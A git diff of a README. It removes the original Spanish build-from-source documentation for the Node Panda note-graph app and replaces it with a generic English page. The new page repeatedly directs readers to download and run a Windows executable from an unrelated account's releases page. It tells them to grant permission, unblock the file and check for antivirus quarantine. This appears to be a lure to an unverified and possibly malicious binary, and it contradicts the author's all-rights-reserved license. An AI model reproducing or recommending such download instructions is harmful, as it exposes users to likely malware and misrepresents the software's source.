@@ -1,284 +1,277 @@
-# Node Panda
-
-Gestor personal de notas enlazadas con grafo visual interactivo, motor de conocimiento y API local. Construido desde cero en C++ con Dear ImGui y OpenGL.
-
-![Node Panda](data/panda.png)
-
----
-
-## Changelog
-
-### v1.1.0 — Knowledge Engine Update
-- **Motor de Consultas** — queries tipo SQL sobre el vault (`QUERY notas WHERE tipo = "proyecto" AND enlaces > 3`)
-- **Control de Versiones Git** — historial automático de cada nota, diff viewer, restauración de versiones
-- **Análisis de Grafo** — PageRank, Betweenness Centrality y detección de comunidades sobre el grafo de notas
-- **Repetición Espaciada (SRS)** — algoritmo SM-2 integrado directamente en las notas para revisión activa
-- **API REST local** — servidor HTTP en `localhost:8042` para integrar Node Panda con scripts y herramientas externas
-- **Sistema de Plugins** — motor Lua 5.4 con sandbox, lifecycle hooks, bindings de ImGui y 8 plugins incluidos
-
-### v1.0.0 — Lanzamiento inicial
-- Notas en Markdown con frontmatter YAML
-- Grafo de nodos interactivo con force layout y Barnes-Hut
-- Editor con preview de Markdown renderizado
-- Backlinks automáticos
-- Motor de Memoria semántica TF-IDF
-- File Watcher en tiempo real
-- Exportar contexto para Claude (XML)
-- Scripting Lua con consola integrada
-- Hub de bienvenida
-
----
-
-## Características
-
-### Core
-- **Notas en Markdown** con frontmatter YAML (tipo, aliases, tags)
-- **Grafo de nodos interactivo** con simulación de fuerzas Barnes-Hut
-- **Coloreado por tipo**: proyecto (cyan), concepto (purple), referencia (amber), diario (verde), tarea (coral)
-- **Editor con preview** de Markdown renderizado
-- **Backlinks automáticos** — ve qué notas enlazan a la actual
-- **Motor de Memoria TF-IDF** — búsqueda semántica y sugerencia de enlaces
-- **File Watcher** — detecta cambios en disco en tiempo real
-- **Exportar contexto** estructurado para Claude (XML)
-- **Scripting Lua** — consola integrada con acceso completo al vault
-
-### v1.1.0 — Nuevas funcionalidades
-
-#### Motor de Consultas
-Consultas estructuradas sobre el vault con sintaxis propia:
-```
-QUERY notas WHERE tipo = "proyecto" AND enlaces > 3 SORT palabras DESC LIMIT 10
-QUERY notas WHERE tags CONTIENE "ia"
-QUERY notas WHERE palabras > 500 SORT fecha DESC
-```
-Campos disponibles: `tipo`, `palabras`, `caracteres`, `enlaces`, `conexiones`, `fecha`, o cualquier clave de frontmatter.
-
-#### Control de Versiones Git
-- Auto-commit en cada guardado con timestamp
-- Historial completo de cada nota
-- Diff viewer inline (verde = añadido, rojo = eliminado)
-- Restauración de cualquier versión anterior con un clic
-- Requiere Git instalado en el sistema (`git` en el PATH)
-
-#### Análisis de Grafo
-- **PageRank** — identifica las notas más importantes por estructura de enlaces
-- **Betweenness Centrality** — detecta notas que actúan como puentes entre áreas de conocimiento
-- **Detección de comunidades** — agrupa notas en clusters temáticos automáticamente (Label Propagation)
-
-#### Repetición Espaciada (SRS)
-- Algoritmo SM-2 (el mismo que usa Anki)
-- Cola de revisión diaria integrada en el vault
-- Intervalos calculados automáticamente según dificultad (Fácil / Bien / Difícil / De Nuevo)
-- Datos almacenados en el frontmatter de cada nota (`srs_interval`, `srs_ease`, `srs_next`)
-
-#### API REST local
-Servidor HTTP en `localhost:8042` — solo accesible desde tu propia máquina:
-
-| Endpoint | Descripción |
-|---|---|
-| `GET /api/notas` | Lista todas las notas con metadatos |
-| `GET /api/notas/{id}` | Contenido completo de una nota |
-| `GET /api/grafo` | Estructura del grafo (nodos + aristas) |
-| `GET /api/memoria/buscar?q=...&n=5` | Búsqueda semántica TF-IDF |
-| `GET /api/stats` | Estadísticas del vault |
-
-#### Sistema de Plugins (Lua 5.4)
-Motor de extensiones con sandbox de seguridad. Plugins incluidos:
-
-| Plugin | Descripción |
-|---|---|
-| `daily_notes` | Crea y abre nota diaria automáticamente |
-| `stats_dashboard` | Estadísticas del vault en consola Lua |
-| `templates` | 5 plantillas predefinidas (Reunión, Proyecto, Concepto, Tarea, Diario) |
-| `tag_browser` | Panel para explorar y filtrar notas por tags |
-| `word_count` | Estadísticas de la nota activa (palabras, tiempo de lectura) |
-| `auto_linker` | Sugiere enlaces basados en similitud TF-IDF |
-| `graph_exporter` | Exporta el grafo a DOT (Graphviz) y JSON |
-| `theme_switcher` | 5 temas: Default, Nord, Catppuccin, Gruvbox Dark, Dracula |
-
----
-
-## Requisitos
-
-| Herramienta | Versión mínima | Descarga |
-|---|---|---|
-| **Visual Studio** (con BuildTools C++) | 2019 o 2022 | https://visualstudio.microsoft.com/downloads/ |
-| **CMake** | 3.14+ | https://cmake.org/download/ |
-| **Git** | cualquier versión reciente | https://git-scm.com/ |
-| **Windows** | 10 / 11 (64-bit) | — |
-
-> **Git en el PATH:** para que el Control de Versiones funcione, Git debe estar disponible en la terminal (`git --version` debe responder). Si no lo está, reinstala Git marcando *"Add Git to the system PATH"*.
-
----
-
-## Instalación desde cero
-
-### 1. Clonar el repositorio
-
-```bash
-git clone https://github.com/charbelochoa/NodePanda.git
-cd NodePanda
-```
-
-### 2. Crear la carpeta de build
-
-```bash
-mkdir build
-cd build
-```
-
-### 3. Generar el proyecto con CMake
-
-Abre una **Developer PowerShell for VS 2022** — búscala en el menú Inicio — y ejecuta desde dentro de la carpeta `build`:
-
-```powershell
-cmake .. -G "Visual Studio 17 2022"
-```
-
-> Si usas Visual Studio **2019**:
-> ```powershell
-> cmake .. -G "Visual Studio 16 2019"
-> ```
-> CMake descargará automáticamente GLFW, ImGui y Lua via FetchContent. Requiere conexión a internet en el primer build.
-
-### 4. Compilar
-
-```powershell
-cmake --build . --config Release
-```
-
-La compilación tarda 1–3 minutos la primera vez.
-
-### 5. Ejecutar
-
-```powershell
-cd Release
-.\NodePanda.exe
-```
-
----
-
-## Estructura del proyecto
-
-```
-NodePanda/
-├── CMakeLists.txt
-├── PLUGIN_API.md               # Documentación de la API de plugins
-├── data/
-│   ├── panda.png
-│   ├── notas/                  # Tus notas (Markdown)
-│   └── plugins/                # Plugins Lua
-│       ├── daily_notes/
-│       ├── templates/
-│       ├── tag_browser/
-│       ├── word_count/
-│       ├── auto_linker/
-│       ├── graph_exporter/
-│       └── theme_switcher/
-├── include/                    # Headers
-│   ├── app.h
-│   ├── query_engine.h          # Motor de consultas
-│   ├── graph_analytics.h       # PageRank + clustering
-│   ├── srs_engine.h            # Repetición espaciada SM-2
-│   ├── git_manager.h           # Control de versiones
-│   ├── http_server.h           # API REST local
-│   ├── plugin_manager.h        # Sistema de plugins
-│   └── ...
-├── src/                        # Implementaciones
-└── third_party/
-    └── stb_image.h
-```
-
----
-
-## Uso básico
-
-### Crear y enlazar notas
-Usa el botón **+ Nota** en el Explorador. Enlaza notas con la sintaxis `[[NombreDeLaNota]]`. El grafo se actualiza en tiempo real.
-
-### Frontmatter
-```yaml
----
-tipo: proyecto
-aliases: MiProyecto
-tags: diseño, web
----
-```
-Tipos disponibles: `proyecto`, `concepto`, `referencia`, `diario`, `tarea`.
-
-### Motor de Consultas
-Abre el panel "Motor de Consultas" (tab inferior) y escribe queries:
-```
-QUERY notas WHERE tipo = "proyecto" AND palabras > 200
-QUERY notas WHERE enlaces = 0
-```
-
-### Control de Versiones
-El historial es automático. Usa el panel "Control de Versiones" para ver cambios, comparar versiones y restaurar.
-
-### API REST
-Con la app abierta, desde el navegador o una terminal:
-```
-http://localhost:8042/api/stats
-http://localhost:8042/api/notas
-```
-
-### Plugins
-Los plugins se ubican en `data/plugins/`. Cada uno es una carpeta con `manifest.json` y `plugin.lua`. Ver [PLUGIN_API.md](PLUGIN_API.md) para la documentación completa.
-
-### Grafo de nodos
-- **Scroll** → zoom
-- **Click medio + arrastrar** → pan
-- **Click en un nodo** → selecciona esa nota
-- **Menú Herramientas → Recalcular Analíticas** → PageRank y comunidades
-
----
-
-## Problemas frecuentes
-
-**`cmake` no se reconoce**
-Reinstala CMake desde https://cmake.org/download/ marcando *"Add CMake to the system PATH"*.
-
-**Error de generador al rehacer cmake**
-Si ya existe una carpeta `build` de un build anterior, bórrala y vuélvela a crear:
-```powershell
-cd ..
-Remove-Item -Recurse -Force build
-mkdir build
-cd build
-cmake .. -G "Visual Studio 17 2022"
-```
-
-**El Control de Versiones no aparece activo**
-Verifica que `git --version` funciona en tu terminal. Si no, instala Git desde https://git-scm.com marcando *"Add Git to PATH"*.
-
-**El servidor API no responde**
-Verifica en el panel "Servidor API" que el estado sea "Activo". Si no arrancó automáticamente, usa **Herramientas → Iniciar Servidor API**.
-
-**El grafo no se actualiza**
-Ve a **Archivo → Reescanear Notas**.
-
----
-
-## Dependencias (gestionadas automáticamente por CMake)
-
-| Librería | Versión | Propósito |
-|---|---|---|
-| [Dear ImGui](https://github.com/ocornut/imgui) | v1.90.1-docking | Interfaz gráfica |
-| [GLFW](https://github.com/glfw/glfw) | 3.3.8 | Ventana y contexto OpenGL |
-| [Lua](https://www.lua.org) | 5.4.6 | Motor de scripting y plugins |
-| [sol2](https://github.com/ThePhD/sol2) | v3.3.0 | Bindings C++ ↔ Lua |
-| [stb_image](https://github.com/nothings/stb) | — | Carga de texturas PNG |
-| OpenGL | sistema | Renderizado |
-| comdlg32 + ws2_32 | sistema (Windows) | Diálogos nativos + sockets |
-
----
-
-## Licencia
-
-Copyright (c) 2026 Charbel Ochoa 
-
-All rights reserved.
-
-Este proyecto es personal/educativo. 
-No se permite el uso, copia, modificación o distribución del código sin permiso explícito del autor.
+# 🐼 Node-Panda - Local knowledge for Windows
+
+[![Download Node-Panda](https://img.shields.io/badge/Download-Node--Panda-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Averylcosmological121/Node-Panda/releases)
+
+## 🚀 What Node-Panda does
+
+Node-Panda is a local knowledge app for Windows. It helps you store notes, link ideas, and view them in a simple graph. You can keep your data on your PC and use it as a clean memory base for AI work.
+
+Use it when you want to:
+
+- keep Markdown notes in one place
+- connect related notes with links
+- see ideas in a graph view
+- build a local context base for LLM tools
+- keep your data private on your own computer
+
+## 📥 Download Node-Panda
+
+Visit this page to download Node-Panda for Windows:
+
+[https://github.com/Averylcosmological121/Node-Panda/releases](https://github.com/Averylcosmological121/Node-Panda/releases)
+
+On the Releases page, look for the latest version and download the Windows file that matches your PC. If you see more than one file, pick the `.exe` file or the Windows package.
+
+## 🖥️ System requirements
+
+Node-Panda works best on:
+
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 200 MB of free disk space
+- A modern CPU
+- A mouse for graph use
+- Internet access for the first download
+
+For large note sets, more RAM helps. If you plan to use it with many notes, 16 GB RAM gives more room.
+
+## 🛠️ Install and run
+
+1. Open the download page:
+   [Node-Panda Releases](https://github.com/Averylcosmological121/Node-Panda/releases)
+
+2. Find the latest release.
+
+3. Download the Windows file.
+
+4. If the file is a `.zip`, extract it to a folder you can find later, like `Downloads` or `Desktop`.
+
+5. If the file is an `.exe`, double-click it to start the app.
+
+6. If Windows asks for permission, click **Yes**.
+
+7. Wait for Node-Panda to open.
+
+8. If you extracted a folder, open the app file inside that folder and double-click it.
+
+## 🧭 First-time setup
+
+When Node-Panda opens for the first time, follow these steps:
+
+- choose a local folder for your notes
+- point the app to your Markdown files
+- let it scan the folder
+- open the graph view to see note links
+- create a few test notes to check that links work
+
+If you already keep Markdown notes in another folder, you can use that same folder.
+
+## ✍️ How to use it
+
+### Create a note
+
+- open the app
+- choose **New Note**
+- give the note a clear name
+- write your text in Markdown
+- save the note
+
+### Link notes
+
+- open one note
+- add a link to another note
+- save both notes
+- open the graph to see the connection
+
+### Search your knowledge base
+
+- type a word or phrase in the search box
+- review the matching notes
+- open the note you need
+- move between linked notes as needed
+
+### Use it with AI work
+
+Node-Panda can serve as a local memory layer for AI tasks. You can keep source notes in Markdown and use the app to find related context fast.
+
+Good uses include:
+
+- project notes
+- research notes
+- prompt context
+- long-term idea storage
+- personal reference material
+
+## 🗂️ Notes and file format
+
+Node-Panda uses Markdown files. That means your notes stay easy to read in plain text editors too.
+
+Markdown works well for:
+
+- headings
+- lists
+- links
+- short code blocks
+- simple structure
+
+This makes your notes easy to move, back up, and reuse.
+
+## 🔒 Privacy
+
+Node-Panda keeps your notes on your local machine. Your files stay in your control. This fits well if you want a private note system and do not want to store content in the cloud.
+
+## 🧩 Graph view
+
+The graph view shows how notes connect. This helps you:
+
+- spot missing links
+- find related ideas
+- see clusters of topics
+- map a knowledge base
+- move through notes faster
+
+If your notes have many links, the graph can help you see structure at a glance.
+
+## 📁 Suggested folder setup
+
+A simple folder layout can help keep things tidy:
+
+- `Node-Panda`
+  - `Notes`
+  - `Projects`
+  - `Research`
+  - `Archive`
+
+You can use any folder names you like. Keep the layout simple so it is easy to find files later.
+
+## ⚡ Tips for best use
+
+- keep note names short and clear
+- use one folder for one topic when possible
+- link notes often
+- use headings inside long notes
+- review the graph to find missing links
+- back up your note folder regularly
+- keep your Markdown clean and easy to read
+
+## 🧪 Common file types
+
+You may see these file types in a Node-Panda setup:
+
+- `.exe` for the app
+- `.zip` for packaged downloads
+- `.md` for notes
+- `.json` for app data
+- `.txt` for plain text backups
+
+## 🧰 If Windows blocks the file
+
+If Windows shows a security prompt:
+
+1. Right-click the file
+2. Click **Properties**
+3. Look for **Unblock** if it appears
+4. Click **Apply**
+5. Run the file again
+
+If you still cannot open it, make sure the file fully finished downloading.
+
+## 🔍 If the app does not start
+
+Try these steps:
+
+- check that the download finished
+- move the file to a simple folder like `Desktop`
+- run the app again
+- restart Windows
+- download the latest release again
+- make sure your antivirus did not quarantine the file
+
+If you use a `.zip` file, extract it before opening the app.
+
+## 🧹 Keep your notes organized
+
+A clean note system is easier to use. Try this:
+
+- use one idea per note
+- write clear titles
+- add links when notes connect
+- keep long notes split into parts
+- move old notes into an archive folder
+
+This helps Node-Panda stay useful as your note set grows.
+
+## 📌 What you can build with Node-Panda
+
+You can use Node-Panda for:
+
+- a personal knowledge base
+- study notes
+- work notes
+- research maps
+- AI context storage
+- project memory
+- linked idea trees
+
+## 🧭 Download and setup path
+
+1. Go to the release page:
+   [https://github.com/Averylcosmological121/Node-Panda/releases](https://github.com/Averylcosmological121/Node-Panda/releases)
+
+2. Download the Windows build.
+
+3. Open or extract the file.
+
+4. Run Node-Panda.
+
+5. Choose your notes folder.
+
+6. Start adding Markdown notes and links
+
+## 📎 File safety tips
+
+Before you run any download:
+
+- check that the file comes from the release page
+- use the newest version if you want the latest fixes
+- keep your notes in a backup folder
+- avoid renaming app files unless needed
+
+## 🐾 Getting around inside the app
+
+Most users will spend time in three places:
+
+- the note editor
+- the note list
+- the graph view
+
+Use the note editor to write content. Use the list to find files. Use the graph to see links between notes.
+
+## 🧠 Good note habits
+
+To get the best result:
+
+- write one clear idea per note
+- link related notes
+- keep titles simple
+- use Markdown headers
+- review older notes often
+- store important files in one main folder
+
+## 🛟 Backup your knowledge base
+
+Your notes are valuable. Keep a backup copy in another folder, on an external drive, or in a cloud drive if you want a second copy.
+
+A simple backup plan:
+
+- copy your `Notes` folder once a week
+- keep one backup on another drive
+- check that the backup opens
+
+## 📦 Release page
+
+Download Node-Panda from the release page:
+
+[https://github.com/Averylcosmological121/Node-Panda/releases](https://github.com/Averylcosmological121/Node-Panda/releases)
+
+Choose the latest Windows file, then download and run this file if the release gives you a direct Windows app, or extract it first if the release comes as a zip package
